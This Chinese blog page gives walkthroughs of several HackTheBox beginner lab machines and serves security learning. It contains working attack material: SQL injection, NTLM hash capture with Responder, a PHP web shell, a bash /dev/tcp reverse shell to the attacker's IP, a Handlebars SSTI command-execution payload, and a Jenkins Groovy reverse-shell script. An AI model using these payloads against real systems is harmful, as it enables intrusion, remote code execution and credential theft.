<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" title="低头学习  抬头看路" href="https://nnnpc.github.io/rss.xml"><link rel="alternate" type="application/atom+xml" title="低头学习  抬头看路" href="https://nnnpc.github.io/atom.xml"><link rel="alternate" type="application/json" title="低头学习  抬头看路" href="https://nnnpc.github.io/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="渗透"><link rel="canonical" href="https://nnnpc.github.io/2024/04/16/HTB%201%E5%B1%82/"><title>HTB 1层 - 靶场 - 渗透 | nnnpc's Blog = 低头学习 抬头看路 = 很多人已经做到了，而他们都曾经和现在的你站在同样的起点上</title><meta name="generator" content="Hexo 6.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">HTB 1层</h1><div class="meta"><span class="item" title="创建时间：2024-04-16 13:58:19"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">发表于</span> <time itemprop="dateCreated datePublished" datetime="2024-04-16T13:58:19+08:00">2024-04-16</time></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">nnnpc's Blog</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><img src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/1.jpg"></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">首页</a></span><i class="ic i-angle-right"></i> <span itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E6%B8%97%E9%80%8F/" itemprop="item" rel="index" title="分类于 渗透"><span itemprop="name">渗透</span></a><meta itemprop="position" content="1"></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E6%B8%97%E9%80%8F/course-3/" itemprop="item" rel="index" title="分类于 靶场"><span itemprop="name">靶场</span></a><meta itemprop="position" content="2"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://nnnpc.github.io/2024/04/16/HTB%201%E5%B1%82/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="nnnpc"><meta itemprop="description" content="很多人已经做到了，而他们都曾经和现在的你站在同样的起点上, 欢迎来交流学习"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="低头学习  抬头看路"></span><div class="body md" itemprop="articleBody"><h1 id="htb-1层"><a class="anchor" href="#htb-1层">#</a> HTB 1 层</h1><h2 id="appointment"><a class="anchor" href="#appointment">#</a> Appointment</h2><p>fscan 扫描</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231207200225184.png" alt=""></p><p>发现开放了 80 端口，浏览器访问 ip</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231207200321995.png" alt=""></p><p>看到登录框尝试进行 sql 注入</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231207200348276.png" alt=""></p><p>注入成功</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231207200411746.png" alt=""></p><p><strong>总结：本台靶机的考点就是普通的 sql 注入，用单引号闭合前面的语句并且使用 #注释 pass 成功实现注入</strong></p><h2 id="sequel"><a class="anchor" href="#sequel">#</a> Sequel</h2><p>fscan 进行扫描</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231207201135816.png" alt=""></p><p>发现 3306 端口开放，3306 是 mysql 数据库的常用端口，用命令进行连接</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -h 10.129.214.75</span><br></pre></td></tr></table></figure><p></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231207201530166.png" alt=""></p><p>接下来就是正常的 sql 语句查询的操作了，flag 在 config 表中</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br><span class="line">use htb;</span><br><span class="line">show tables;</span><br><span class="line">select * from config;</span><br></pre></td></tr></table></figure><p></p><p><strong>总结：该台靶机的考点就在于 3306 端口开放的 mysql 服务，通过命令无密码连接之后利用 sql 语句去查找表中的字段值</strong></p><h2 id="crocodile"><a class="anchor" href="#crocodile">#</a> Crocodile</h2><p>fscan 扫描</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231207202509139.png" alt=""></p><p>21 端口开放了 ftp 服务，并且扫描结果已经显示出来了 anonymous 可以免密登录</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231207202927003.png" alt=""></p><p>同上面扫描结果显示的一样，有 allowed.userlist、allowed.userlist.passwd 两个文件，都 get 下来</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231207203137843.png" alt=""></p><p>能看到是对应的用户名密码，并且这台靶机除了开放 21 端口外还开放了 80 端口，有 web 服务，访问看看</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231207203314506.png" alt=""></p><p>dirsearch 或者 gobuster 扫描一下目录</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 ./dirsearch.py -u 10.129.1.15</span><br><span class="line">gobuster dir --url http://10.129.1.15 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -x .php</span><br></pre></td></tr></table></figure><p></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231207203557223.png" alt=""></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231207203623181.png" alt=""></p><p>发现登录口 login.php，访问</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231207203742590.png" alt=""></p><p>用上之前 ftp 得到的 admin 用户和密码</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin </span><br><span class="line">rKXM59ESxesUFHAd</span><br></pre></td></tr></table></figure><p></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231207203841875.png" alt=""></p><p>后台直接显示 flag</p><p><strong>总结：这台靶机的考点主要还是在 ftp 登录和传输文件，将 web 端的后台登陆账号密码放在了默认无密码用户登录的 ftp 当中，登录后台获取 flag</strong></p><h2 id="responder"><a class="anchor" href="#responder">#</a> Responder</h2><p>fscan 扫描</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208160335360.png" alt=""></p><p>开放了 80 端口，web 端访问一下</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208161936675.png" alt=""></p><p>发现重定向到域名解析失败，修改 /etc/hosts，添加</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.129.189.214 unika.htb</span><br></pre></td></tr></table></figure><p></p><p>刷新访问成功</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208162218597.png" alt=""></p><p>这里需要用到 responder 设置监听来伪造服务端，详细说明一下</p><p>如果客户端 / 目标无法通过 DNS 域名解析，则会回退到 LLMNR (在 Windows<br>Vista 中入) 和 NBT-NS 进行解析</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LLMNR (链路本地多播名称解析): 多播方式查找网络上的主机，其它主机响应IP，然后连接</span><br><span class="line">NetBIOS(NBT-NS网络名称服务): 将主机的广播请求发送到本地子网，如果其它主机存在该名称，就响应。</span><br></pre></td></tr></table></figure><p></p><p>这两种协议都是基于信任的，只有目标主机才会相应，但是攻击者可以冒充被请求的主机发出响应，windows 主机之间有多种认证方式，这里使用的是 NTLM 协议</p><p>因此可以梳理一下本题抓取 hash 大致流程：</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.先在本地设置responder监听</span><br><span class="line">2.利用漏洞进行本地文件包含，但目标无法通过NDS域名解析，回退到两个协议</span><br><span class="line">3.LLMNR与NBT-NS配合进行广播寻找，这是监听的responder发出了相应</span><br><span class="line">4.根据ntlm的认证流程，先后收到了来自目标机子的username、domainname以及用目标机子密码hash加密的伪造responder机子传输过去的challenge（作为respond）</span><br><span class="line">5.获取hash使用john进行爆破</span><br></pre></td></tr></table></figure><p></p><p>对 ntlm 认证过程不了解的可以去看看另一篇（NTLM 协议流量解密）</p><p>知道了大致流程原理之后进行操作，先设置监听</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -I tun0</span><br></pre></td></tr></table></figure><p></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208170545546.png" alt=""></p><p>接着在浏览器进行本地文件包含的操作</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208170720288.png" alt=""></p><p>伪造成功，成功抓取</p><p>将 hash 保存到 hash.txt 中，使用 john 或者 hashcat 利用 rockyou 字典进行爆破</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span><br><span class="line">hashcat -m 5600 hash.txt rockyou.txt -o out.txt --force</span><br></pre></td></tr></table></figure><p></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208170946097.png" alt=""></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208171025425.png" alt=""></p><p>得到密码 badminton</p><p>fscan 端口扫描没扫全，再用 nmap 进行一次扫描</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208171405840.png" alt=""></p><p>发现 5985 端口开放，上网查找能知道这个端口的常用服务是 winrm 远程管理</p><p>之前已经得到了用户名和密码，配合 winrm 进行远程登录</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install evil-winrm	#安装</span><br><span class="line">evil-winrm -i 靶机IP -u Administrator -p badminton #使用</span><br></pre></td></tr></table></figure><p></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208172011795.png" alt=""></p><p>flag 在 mike 用户的桌面中</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208172117681.png" alt=""></p><p><strong>总结：本台靶机利用 responder 配合 5985 的 winrm 进行远程登录，需要注意的是 responder 监听抓取认证过程中用户密码 hash 的流程</strong></p><h2 id="three"><a class="anchor" href="#three">#</a> Three</h2><p>fscan 进行扫描</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211154029720.png" alt=""></p><p>发现开放了 80 端口，浏览器进行访问</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211154637840.png" alt=""></p><p>在 web 页面底端找到了带有域名的 email，添加到 /etc/hosts 访问一下</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211154818959.png" alt=""></p><p>既然得到了域名，进一步进行信息搜集，爆破一下子域名</p><p></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster vhost -w /usr/share/wordlists/subnames.txt -u http://thetoppers.htb</span><br></pre></td></tr></table></figure><p></p><p>得到了 s3.thetoppers.htb，没有爆破成功的也可以直接看题目提示</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211160159874.png" alt=""></p><p>同样先加到 /etc/hosts 当中，访问</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211160539839.png" alt=""></p><p>接下来可以利用 aws 工具对 s3 的桶进行操作，并且写入木马拿到 shell</p><p>安装：</p><p></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install -y awscli -y</span><br></pre></td></tr></table></figure><p></p><p>配置：</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws configure</span><br></pre></td></tr></table></figure><p></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211161038245.png" alt=""></p><p>列出所有 s3 的桶：</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws --endpoint=http://s3.thetoppers.htb s3 ls</span><br></pre></td></tr></table></figure><p></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211161118930.png" alt=""></p><p>列出 s3 下的目录及对象：</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb</span><br></pre></td></tr></table></figure><p></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211161223676.png" alt=""></p><p>接着写入木马到文件当中，这里使用了 GET 传参的方式，用来进行远程命令执行</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;&lt;?php system($_GET[&quot;nnnpc&quot;]); ?&gt;&#x27; &gt; shell.php</span><br></pre></td></tr></table></figure><p></p><p>利用 cp 命令 copy 到桶里</p><p></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb</span><br></pre></td></tr></table></figure><p></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211161752654.png" alt=""></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211161940467.png" alt=""></p><p>木马被成功解析</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211162120236.png" alt=""></p><p>在上一级目录中获取了 flag</p><p>但对于平时的渗透过程中，光能 rce 是肯定不够的，所以需要想办法进行权限维持，这里可以配合已经上传的木马进行反弹 shell 的操作</p><p><span class="exturl" data-url="aHR0cDovL3huLS1zaGVsbC1mZzFoeWppMGR4MGpmeGFuM3I3djJjZnJpbnc2ai5zaA==">先写一个可执行文件 shell.sh</span></p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/10.10.14.66/1234 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p></p><p>ip 为需要反弹的 ip，也就是攻击机的 tun0</p><p>这里有两种方法上传可执行文件，一种就是本地利用 python 开放个 web 端口，利用 shell.php 远程 curl 下载并执行</p><p>还有一种方法就是通过 aws 同样上传，并通过 shell.php 去执行 sh 文件，这里演示第二种</p><p><span class="exturl" data-url="aHR0cDovL3huLS1hd3NzaGVsbC16NjVtcDJ1MXJ5Ym83YWxlOGsuc2g=">首先 aws 同样将 shell.sh</span> copy 到桶里</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws --endpoint=http://s3.thetoppers.htb s3 cp shell.sh s3://thetoppers.htb</span><br></pre></td></tr></table></figure><p></p><p>利用 shell.php 查看</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211163437543.png" alt=""></p><p>成功上传，监听 sh 文件中的 1234 端口</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 1234</span><br></pre></td></tr></table></figure><p></p><p>利用 bash 执行 sh 文件</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://thetoppers.htb/shell.php?nnnpc=bash shell.sh</span><br></pre></td></tr></table></figure><p></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211163757713.png" alt=""></p><p>成功获得 shell</p><p><strong>总结：本台靶机主要的知识点在 aws 命令对 s3 的桶进行操作写马，写入木马以后再进行一些反弹 shell 的权限维持操作</strong></p><h2 id="ignition"><a class="anchor" href="#ignition">#</a> Ignition</h2><p>fscan 扫描</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211192521642.png" alt=""></p><p>80 端口开放，绑定 hosts 浏览器访问</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211192635413.png" alt=""></p><p>使用 dirsearch 或 gobuster 扫描目录</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://ignition.htb/ -w /usr/share/wordlists/dirb/common.txt</span><br></pre></td></tr></table></figure><p></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211193800964.png" alt=""></p><p>发现了 /admin 目录，访问</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211194042648.png" alt=""></p><p>使用 bp 密码弱口令爆破得到 admin qwerty123</p><p>登录成功即可获得 flag</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211194339146.png" alt=""></p><p><strong>总结：本题的考点主要在于目录爆破和后台账号密码的爆破</strong></p><h2 id="bike"><a class="anchor" href="#bike">#</a> Bike</h2><p>fscan 扫描</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211200259514.png" alt=""></p><p>80 端口开放，同样进行访问</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211200322195.png" alt=""></p><p>测试发现存在 ssti 模板注入</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211200429873.png" alt=""></p><p>payload：</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;#with &quot;s&quot; as |string|&#125;&#125;  &#123;&#123;#with &quot;e&quot;&#125;&#125;  &#123;&#123;#with split as |conslist|&#125;&#125;  &#123;&#123;this.pop&#125;&#125;  &#123;&#123;this.push (lookup string.sub &quot;constructor&quot;)&#125;&#125;  &#123;&#123;this.pop&#125;&#125;  &#123;&#123;#with string.split as |codelist|&#125;&#125;  &#123;&#123;this.pop&#125;&#125;  &#123;&#123;this.push &quot;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /root/flag.txt&#x27;);&quot;&#125;&#125;  &#123;&#123;this.pop&#125;&#125;  &#123;&#123;#each conslist&#125;&#125;  &#123;&#123;#with (string.sub.apply 0 codelist)&#125;&#125;  &#123;&#123;this&#125;&#125;  &#123;&#123;/with&#125;&#125;  &#123;&#123;/each&#125;&#125;  &#123;&#123;/with&#125;&#125;  &#123;&#123;/with&#125;&#125;  &#123;&#123;/with&#125;&#125;  &#123;&#123;/with&#125;&#125;</span><br></pre></td></tr></table></figure><p></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211200631890.png" alt=""></p><p><strong>总结：本台靶机主要是利用了 ssti 模板注入比较普通的注入链子</strong></p><h2 id="funnel"><a class="anchor" href="#funnel">#</a> Funnel</h2><p>fscan 扫描</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211201622266.png" alt=""></p><p>发现开放了 21 端口 ftp 服务</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211201814607.png" alt=""></p><p>anonymous 用户名空密码登录并发现了 mail_backup 文件夹</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211201903381.png" alt=""></p><p>get 文件夹中的两个文件</p><p>并且在 pdf 中发现了较为关键的默认密码：funnel123#!#</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211202113397.png" alt=""></p><p>在 welcome 文件中发现了 5 个目的用户名</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211202217352.png" alt=""></p><p>结合刚才的 22 开放端口，尝试遍历这五个用户名和默认密码</p><p>最终在 christine 用户登录成功</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh christine@10.129.228.195</span><br></pre></td></tr></table></figure><p></p><p>检查哪些端口在执行本地监听</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ss -tln</span><br></pre></td></tr></table></figure><p></p><p>检查在端口上默认运行的服务</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ss -tl</span><br></pre></td></tr></table></figure><p></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211202822023.png" alt=""></p><p>发现 5432 端口运行了 postgresql 服务</p><p>可以通过 psql 进行连接操作</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211203106559.png" alt=""></p><p>但发现远程主机并没有该工具并且现在所拥有的权限不足以去下载工具</p><p>这里就利用 ssh 搭建隧道，实现本地端口的转发</p><p>这里理解一下本地端口转发：实质上就是在客户机指定端口上分配一个套接字侦听器，当连接到该端口时，客户机会将现有的 ssh 会话发送到远程服务器的端口，</p><p>该隧道将网络流量从本地端口转发到了远程端口，使本地执行的命令能够通过 ssh 隧道转发到远程进行执行</p><p>接下来使用 ssh 搭建隧道</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 1234:localhost:5432 christine@10.129.228.195</span><br></pre></td></tr></table></figure><p></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211203856868.png" alt=""></p><p>直接在本地下载 psql 工具并访问本地的 1234 端口</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211204024063.png" alt=""></p><p>成功通过 ssh 隧道实现本地端口转发，连接了远程 postgresql 服务</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\l # \list缩写，列出现有数据库，按q退出</span><br><span class="line">\c secrets # 连接数据库</span><br><span class="line">\dt #查看数据库中的表</span><br><span class="line">select * from flag;</span><br></pre></td></tr></table></figure><p></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211204452664.png" alt=""></p><p><strong>总结：本台靶机主要的知识点在于利用 ssh 搭建隧道实现本地端口转发，解决远程主机无法使用 psql 的问题</strong></p><h2 id="pennyworth"><a class="anchor" href="#pennyworth">#</a> Pennyworth</h2><p>fscan 扫描</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231212130240155.png" alt=""></p><p>发现 8080 端口开放，浏览器访问</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231212130346242.png" alt=""></p><p>发现登录口，弱口令爆破得到</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">账号：root</span><br><span class="line"></span><br><span class="line">密码：password</span><br></pre></td></tr></table></figure><p></p><p>成功登录后台</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231212130740293.png" alt=""></p><p>而在 Jenkins 的脚本控制台中，可以编写和运行 Groovy 脚本，我们就可以插入反弹 shell 的 Groovy 脚本</p><p>路径：<span class="exturl" data-url="aHR0cDovLzEwLjEyOS4xMDkuNDA6ODA4MC9zY3JpcHQ=">http://10.129.109.40:8080/script</span></p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">String host=&quot;host_ip&quot;;</span><br><span class="line"></span><br><span class="line">int port=监听端口;</span><br><span class="line"></span><br><span class="line">String cmd=&quot;/bin/bash&quot;;</span><br><span class="line"></span><br><span class="line">Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed())&#123;while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try &#123;p.exitValue();break;&#125;catch (Exception e)&#123;&#125;&#125;;p.destroy();s.close();</span><br></pre></td></tr></table></figure><p></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231212132127116.png" alt=""></p><p>本地监听 1234 端口</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 1234</span><br></pre></td></tr></table></figure><p></p><p>点击 run 运行脚本成功获得 shell</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231212132407546.png" alt=""></p><p>flag 在 root 目录下</p><p><strong>总结：本台靶机主要考点在 Jenkins 的 script 目录下可以编写运行 Groovy 脚本，利用该功能编写脚本实现 shell 的反弹</strong></p><h2 id="tactics"><a class="anchor" href="#tactics">#</a> Tactics</h2><p>fscan 扫描</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231212133219839.png" alt=""></p><p>开放了 445 端口，使用 smbclient 列出 Administrator 用户下的共享文件（空密码）</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L 10.129.172.139 -U Administrator</span><br></pre></td></tr></table></figure><p></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231212133926609.png" alt=""></p><p>连接 C$ 文件</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient \\\\10.129.172.139\\C$ -U Administrator</span><br></pre></td></tr></table></figure><p></p><p>最终的 flag 在 Administrator 用户的 Desktop 中</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231212134313517.png" 